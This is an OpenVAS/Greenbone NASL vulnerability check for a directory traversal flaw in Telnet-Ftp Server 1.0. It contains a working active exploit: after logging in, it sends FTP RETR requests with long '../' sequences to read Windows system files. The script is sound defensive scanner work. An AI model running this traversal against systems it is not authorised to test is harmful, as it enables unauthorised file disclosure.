# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803736");
  script_version("2025-07-16T05:43:53+0000");
  script_tag(name:"last_modification", value:"2025-07-16 05:43:53 +0000 (Wed, 16 Jul 2025)");
  script_tag(name:"creation_date", value:"2013-08-19 10:32:03 +0530 (Mon, 19 Aug 2013)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");

  script_cve_id("CVE-2006-6240", "CVE-2006-6241");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Telnet-Ftp Server <= 1.0 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/telnet_ftp/detected", "Host/runs_windows");

  script_tag(name:"summary", value:"Telnet-Ftp server is prone to directory traversal
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends the crafted directory traversal attack request and
  checks whether it is able to read the system file or not.");

  script_tag(name:"insight", value:"The flaw exists due to error in handling of file names. It does
  not properly sanitise filenames containing directory traversal sequences that are received from
  an FTP server.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the affected application.");

  script_tag(name:"affected", value:"Telnet-Ftp Server version 1.0 (Build 1.218) and probably
  prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21339");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21340");

  exit(0);
}

include("host_details.inc");
include("ftp_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = ftp_get_port( default:21 );

banner = ftp_get_banner( port:port );
if( ! banner || ( "220 FTP Server ready" >!< banner && "Telnet-Ftp Server" >!< banner ) )
  exit( 0 );

soc = open_sock_tcp(port);
if( ! soc )
  exit( 0 );

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in( socket:soc, user:user, pass:pass );
if( ! login_details ) {
  ftp_close( socket:soc );
  exit( 0 );
}

port2 = ftp_get_pasv_port( socket:soc );
if( ! port2 ) {
  ftp_close( socket:soc );
  exit( 0 );
}

soc2 = open_sock_tcp( port2, transport:get_port_transport( port ) );
if( ! soc2 ) {
  ftp_close( socket:soc );
  exit(0);
}

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = "../../../../../../../../../../../../../../../../" + file;

  req = string("RETR ", file);
  send( socket:soc, data:string( req, "\r\n" ) );

  res = ftp_recv_data( socket:soc2 );

  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
    ftp_close( socket:soc );
    close( soc2 );
    report  = "Used request:  " + req + '\n';
    report += "Received data: " + match;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

ftp_close( socket:soc );
close( soc2 );
exit( 0 );
